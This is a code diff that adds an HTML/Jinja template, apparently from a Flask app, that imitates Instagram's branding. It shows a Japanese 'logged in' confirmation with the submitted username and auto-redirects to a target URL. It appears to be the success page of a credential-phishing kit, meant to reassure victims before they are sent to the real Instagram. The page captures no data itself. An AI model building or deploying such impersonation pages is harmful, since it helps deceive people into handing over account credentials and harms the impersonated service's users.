@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="refresh" content="1.2;url={{ target }}">
+<title>Instagram</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+<style>
+  .ok-wrap { background:#fff; border:1px solid #dbdbdb; width:350px; padding:44px 40px 22px; text-align:center; }
+  .ok-mark { width:56px; height:56px; border-radius:50%; background:#0095f6;
+             display:flex; align-items:center; justify-content:center; margin:0 auto 18px; }
+  .ok-title { font-size:16px; font-weight:600; margin:0 0 8px; }
+  .ok-sub { font-size:13px; color:#8e8e8e; line-height:1.5; margin:0 0 20px; word-break:break-all; }
+  .ok-note { font-size:12px; color:#00376b; background:#e7f3ff; padding:10px;
+             line-height:1.5; margin:0 0 18px; }
+  .ok-btn { display:flex; align-items:center; justify-content:center; width:100%; height:34px;
+            background:#0095f6; color:#fff; border-radius:8px; font-size:14px;
+            font-weight:600; text-decoration:none; }
+</style>
+</head>
+<body>
+
+<div class="ok-wrap">
+  <div class="ok-mark">
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff"
+         stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M4 12.5l5.5 5.5L20 7"></path>
+    </svg>
+  </div>
+  <p class="ok-title">ログインしました</p>
+  <p class="ok-sub">{{ username }}</p>
+
+  {% if note %}<p class="ok-note">{{ note }}</p>{% endif %}
+
+  <a class="ok-btn" href="{{ target }}">Instagram を開く</a>
+</div>
+
+<div class="signup">まもなく自動的にInstagramへ移動します</div>
+
+</body>
+</html>
